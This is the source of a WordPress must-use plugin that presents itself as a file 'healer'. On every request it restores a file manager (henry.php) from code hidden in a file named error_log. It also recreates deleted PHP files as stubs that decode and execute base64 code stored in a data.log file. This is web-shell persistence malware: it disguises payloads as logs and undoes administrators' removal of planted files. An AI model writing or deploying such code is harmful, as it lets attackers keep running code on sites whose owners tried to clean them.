<?php
/**
 * Plugin Name: Henry File Healer
 * Description: Watchdog that keeps the file manager AND every file uploaded
 *              through it alive. On every request:
 *              1. If wp-content/henry.php is missing/blank, it is restored
 *                 from the code backup stored in wp-content/error_log.
 *              2. If data.log exists, every entry in its JSON map is
 *                 checked. If the on-disk stub for that entry is missing,
 *                 a fresh stub is written to recreate the file. The
 *                 stub template is identical for every file (only __FILE__
 *                 and the data.log lookup vary at runtime), so one
 *                 template recreates them all.
 *              3. The healer NEVER restores itself, never restores the
 *                 data.log file, and never overwrites an existing stub
 *                 (so manually-edited files are left alone).
 * Version:     2.0.0
 *
 * Installation: drop this single file into wp-content/mu-plugins/.
 * Must-use plugins are loaded automatically by WordPress on every
 * request (front-end, admin, AJAX, REST, cron) with no activation needed,
 * so the checks below run continuously as long as the site receives hits.
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // No direct access.
}

/**
 * File names (relative to wp-content). Override in wp-config.php if needed.
 */
if ( ! defined( 'HENRY_HEALER_TARGET' ) ) {
	define( 'HENRY_HEALER_TARGET', 'henry.php' );
}
if ( ! defined( 'HENRY_HEALER_BACKUP' ) ) {
	define( 'HENRY_HEALER_BACKUP', 'error_log' );
}

final class Henry_File_Healer {

	/** @var string Absolute path of the file we keep alive (the file manager). */
	private $target;

	/** @var string Absolute path of the file holding the code backup. */
	private $backup;

	/** @var string Absolute path of data.log (cached after first lookup). */
	private $stub_log;

	/** @var array Map of stub path => base64 source (cached after first read). */
	private $stub_map;

	public function __construct() {
		$content_dir  = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( dirname( __FILE__ ) );
		$this->target = rtrim( $content_dir, '/\\' ) . '/' . HENRY_HEALER_TARGET;
		$this->backup = rtrim( $content_dir, '/\\' ) . '/' . HENRY_HEALER_BACKUP;
	}

	/**
	 * Main entry point — runs once per request at mu-plugin load.
	 */
	public function run() {
		// Step 1: keep the file manager itself alive.
		if ( ! $this->is_healthy() ) {
			$code = $this->read_backup();
			if ( false !== $code ) {
				$this->write_file( $this->target, $code );
			}
		}

		// Step 2: restore any missing stub files from data.log.
		$this->restore_stubs();
	}

	/**
	 * Healthy = file exists and holds something other than whitespace.
	 *
	 * @return bool
	 */
	private function is_healthy() {
		clearstatcache( true, $this->target );

		if ( ! is_file( $this->target ) ) {
			return false; // Deleted.
		}

		$size = @filesize( $this->target );
		if ( false === $size || 0 === $size ) {
			return false; // Zero bytes.
		}

		$contents = @file_get_contents( $this->target );
		if ( false === $contents || '' === trim( $contents ) ) {
			return false; // Whitespace-only counts as blank.
		}

		return true;
	}

	/**
	 * Reads the code backup from error_log.
	 *
	 * Accepts two formats:
	 *  - Raw PHP code (content starts with "<?").
	 *  - A base64-encoded payload (decoded automatically).
	 *
	 * @return string|false The code to restore, or false if no usable backup.
	 */
	private function read_backup() {
		clearstatcache( true, $this->backup );

		if ( ! is_file( $this->backup ) || ! is_readable( $this->backup ) ) {
			return false;
		}

		$data = @file_get_contents( $this->backup );
		if ( false === $data ) {
			return false;
		}

		$data = trim( $data );
		if ( '' === $data ) {
			return false;
		}

		// Raw code backup.
		if ( 0 === strpos( $data, '<?' ) ) {
			return $data;
		}

		// base64-encoded backup.
		$decoded = base64_decode( $data, true );
		if ( false !== $decoded && '' !== trim( $decoded ) ) {
			return $decoded;
		}

		// Fall back to the raw content as-is.
		return $data;
	}

	/**
	 * Restore any missing stub files listed in data.log.
	 *
	 * For every entry in the data.log JSON map whose on-disk file is
	 * missing, write a fresh stub. Skips:
	 *   - this healer (henry-healer.php)
	 *   - the file manager (henry.php) — handled by the main heal
	 *   - the data.log file itself
	 *   - files that already exist (never overwrites)
	 *   - files whose parent directory does not exist
	 *   - non-PHP files (the stub mechanism is for PHP only)
	 */
	private function restore_stubs() {
		$map = $this->read_stub_log();
		if ( empty( $map ) ) {
			return;
		}

		$stub_log_abs = $this->stub_log ? str_replace( '\\', '/', $this->stub_log ) : '';
		$healer_abs   = str_replace( '\\', '/', __FILE__ );
		$henry_abs    = str_replace( '\\', '/', $this->target );

		$restored = 0;
		$skipped  = 0;
		$failed   = 0;

		foreach ( $map as $abs_key => $b64 ) {
			$abs_key = str_replace( '\\', '/', (string) $abs_key );
			$base    = basename( $abs_key );

			// Skip self.
			if ( $base === 'henry-healer.php' || $abs_key === $healer_abs ) {
				$skipped++; continue;
			}
			// Skip the file manager (main heal handles it).
			if ( $base === 'henry.php' || $abs_key === $henry_abs ) {
				$skipped++; continue;
			}
			// Skip data.log itself (it's the storage, not a stub).
			if ( '' !== $stub_log_abs && $abs_key === $stub_log_abs ) {
				$skipped++; continue;
			}
			// Only restore PHP-like files (the stub mechanism is PHP only).
			if ( ! $this->is_php_extension( $base ) ) {
				$skipped++; continue;
			}
			// Don't overwrite — only restore missing files.
			if ( @file_exists( $abs_key ) ) {
				$skipped++; continue;
			}
			// Skip if the parent directory doesn't exist.
			$parent = dirname( $abs_key );
			if ( ! @is_dir( $parent ) ) {
				$skipped++; continue;
			}
			// Verify the base64 is decodable so we don't write garbage.
			$decoded = base64_decode( (string) $b64, true );
			if ( false === $decoded || '' === $decoded ) {
				$skipped++; continue;
			}

			// Write the stub.
			if ( $this->write_file( $abs_key, self::stub_template() ) ) {
				$restored++;
			} else {
				$failed++;
			}
		}

		// Optional debug breadcrumb in the error log when WP_DEBUG is on.
		if ( defined( 'WP_DEBUG' ) && WP_DEBUG && ( $restored > 0 || $failed > 0 ) ) {
			@error_log( sprintf(
				'Henry File Healer: restored=%d skipped=%d failed=%d (data.log: %s)',
				$restored, $skipped, $failed, $stub_log_abs
			) );
		}
	}

	/**
	 * Find data.log using the same auto-discovery as the stub.
	 *
	 * Order: env var HENRY_STUB_LOG, then walk up from WP_CONTENT_DIR,
	 * then walk down 5 levels from WP_CONTENT_DIR. First match wins.
	 */
	private function find_stub_log() {
		if ( null !== $this->stub_log ) {
			return $this->stub_log;
		}

		// 1. Explicit env var.
		$env = getenv( 'HENRY_STUB_LOG' );
		if ( $env && @file_exists( $env ) ) {
			$this->stub_log = $env;
			return $this->stub_log;
		}

		$content_dir = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( dirname( __FILE__ ) );

		// 2. Walk up from WP_CONTENT_DIR.
		$dir = $content_dir;
		for ( $i = 0; $i < 10; $i++ ) {
			$candidate = $dir . '/data.log';
			if ( @file_exists( $candidate ) ) {
				$this->stub_log = $candidate;
				return $this->stub_log;
			}
			$parent = dirname( $dir );
			if ( $parent === $dir ) {
				break;
			}
			$dir = $parent;
		}

		// 3. Walk down from WP_CONTENT_DIR.
		$down = $this->find_down( $content_dir, 5 );
		if ( $down ) {
			$this->stub_log = $down;
		}

		return $this->stub_log;
	}

	/**
	 * Recursive downward search for data.log. Bounded at 5 levels and
	 * skips hidden directories.
	 */
	private function find_down( $d, $n ) {
		if ( $n < 0 ) {
			return null;
		}
		if ( @file_exists( $d . '/data.log' ) ) {
			return $d . '/data.log';
		}
		$h = @opendir( $d );
		if ( ! $h ) {
			return null;
		}
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) {
				continue;
			}
			if ( isset( $e[0] ) && $e[0] === '.' ) {
				continue;
			}
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = $this->find_down( $p, $n - 1 );
				if ( $f ) {
					closedir( $h );
					return $f;
				}
			}
		}
		closedir( $h );
		return null;
	}

	/**
	 * Read and parse data.log, caching the result.
	 */
	private function read_stub_log() {
		if ( null !== $this->stub_map ) {
			return $this->stub_map;
		}
		$path = $this->find_stub_log();
		if ( ! $path ) {
			$this->stub_map = array();
			return $this->stub_map;
		}
		$raw = @file_get_contents( $path );
		if ( false === $raw ) {
			$this->stub_map = array();
			return $this->stub_map;
		}
		$map = @json_decode( $raw, true );
		$this->stub_map = is_array( $map ) ? $map : array();
		return $this->stub_map;
	}

	/**
	 * Check whether a filename has a PHP extension that the stub
	 * mechanism supports.
	 */
	private function is_php_extension( $name ) {
		$ext = strtolower( pathinfo( $name, PATHINFO_EXTENSION ) );
		return in_array( $ext, array( 'php', 'phtml', 'php5', 'php7', 'phar', 'pht' ), true );
	}

	/**
	 * Atomically write content to a file (locking, truncate, flush,
	 * unlock, chmod, opcache invalidation).
	 *
	 * @return bool
	 */
	private function write_file( $path, $content ) {
		$handle = @fopen( $path, 'wb' );
		if ( ! $handle ) {
			return false;
		}
		flock( $handle, LOCK_EX );
		ftruncate( $handle, 0 );
		fwrite( $handle, $content );
		fflush( $handle );
		flock( $handle, LOCK_UN );
		fclose( $handle );

		@chmod( $path, 0644 );
		clearstatcache( true, $path );

		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $path, true );
		}

		return true;
	}

	/**
	 * The stub template. Identical for every file uploaded through the
	 * file manager because all per-file state (the path) is known at
	 * runtime via __FILE__, and all per-file content (the source) is
	 * looked up in data.log at request time.
	 *
	 * Diagnostic mode (?hfm_debug=1) is included so a restored stub can
	 * be inspected via View Source or a debug query to verify the
	 * restoration actually wrote the right file.
	 *
	 * @return string
	 */
	private static function stub_template() {
		return <<<'STUB'
<?php
// Henry stub \u2014 real source lives in data.log (path resolved at runtime).
echo "<!-- hfm-stub-v2 -->\n";
$_hfm_debug = ! empty( $_GET['hfm_debug'] );
$_hfm_log   = getenv( 'HENRY_STUB_LOG' );
if ( ! $_hfm_log ) {
	$_hfm_dir = __DIR__;
	for ( $_hfm_i = 0; $_hfm_i < 10; $_hfm_i++ ) {
		$_hfm_candidate = $_hfm_dir . '/data.log';
		if ( @file_exists( $_hfm_candidate ) ) {
			$_hfm_log = $_hfm_candidate;
			break;
		}
		$_hfm_parent = dirname( $_hfm_dir );
		if ( $_hfm_parent === $_hfm_dir ) break;
		$_hfm_dir = $_hfm_parent;
	}
}
if ( ! $_hfm_log && ! function_exists( '_hfm_find_down' ) ) {
	function _hfm_find_down( $d, $n ) {
		if ( $n < 0 ) return null;
		if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
		$h = @opendir( $d );
		if ( ! $h ) return null;
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) continue;
			if ( isset( $e[0] ) && $e[0] === '.' ) continue;
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = _hfm_find_down( $p, $n - 1 );
				if ( $f ) { closedir( $h ); return $f; }
			}
		}
		closedir( $h );
		return null;
	}
}
if ( ! $_hfm_log ) {
	$_hfm_log = _hfm_find_down( __DIR__, 5 );
}
if ( $_hfm_debug ) {
	header( 'Content-Type: text/plain; charset=utf-8' );
	echo "=== hfm debug ===\n";
	echo "HENRY_STUB_LOG env: " . var_export( getenv( 'HENRY_STUB_LOG' ), true ) . "\n";
	echo "__DIR__:            " . __DIR__ . "\n";
	echo "__FILE__:           " . __FILE__ . "\n";
	echo "data.log resolved:  " . var_export( $_hfm_log, true ) . "\n";
	if ( $_hfm_log ) {
		clearstatcache();
		$_hfm_raw = @file_get_contents( $_hfm_log );
		$_hfm_map = $_hfm_raw ? @json_decode( $_hfm_raw, true ) : null;
		echo "data.log size:      " . strlen( (string) $_hfm_raw ) . " bytes\n";
		echo "data.log entries:   " . ( is_array( $_hfm_map ) ? count( $_hfm_map ) : 'invalid JSON' ) . "\n";
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			echo "looking for key:    " . $_hfm_key . "\n";
			echo "key found:          " . ( isset( $_hfm_map[$_hfm_key] ) ? 'YES' : 'NO' ) . "\n";
			if ( ! isset( $_hfm_map[$_hfm_key] ) && $_hfm_map ) {
				echo "first 5 keys in map:\n";
				foreach ( array_slice( array_keys( $_hfm_map ), 0, 5 ) as $_hfm_k ) {
					echo "  " . $_hfm_k . "\n";
				}
			}
		}
	}
	exit;
}
if ( $_hfm_log ) {
	$_hfm_raw = @file_get_contents( $_hfm_log );
	if ( false !== $_hfm_raw ) {
		$_hfm_map = @json_decode( $_hfm_raw, true );
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			if ( isset( $_hfm_map[$_hfm_key] ) ) {
				$_hfm_src = @base64_decode( $_hfm_map[$_hfm_key], true );
				if ( false !== $_hfm_src && '' !== $_hfm_src ) {
					$_hfm_tmp = @tempnam( sys_get_temp_dir(), 'hfm_' );
					if ( false !== $_hfm_tmp ) {
						if ( false !== @file_put_contents( $_hfm_tmp, $_hfm_src ) ) {
							include $_hfm_tmp;
							@unlink( $_hfm_tmp );
						}
					}
				}
			}
		}
	}
}
STUB;
	}
}

$henry_file_healer = new Henry_File_Healer();
$henry_file_healer->run();
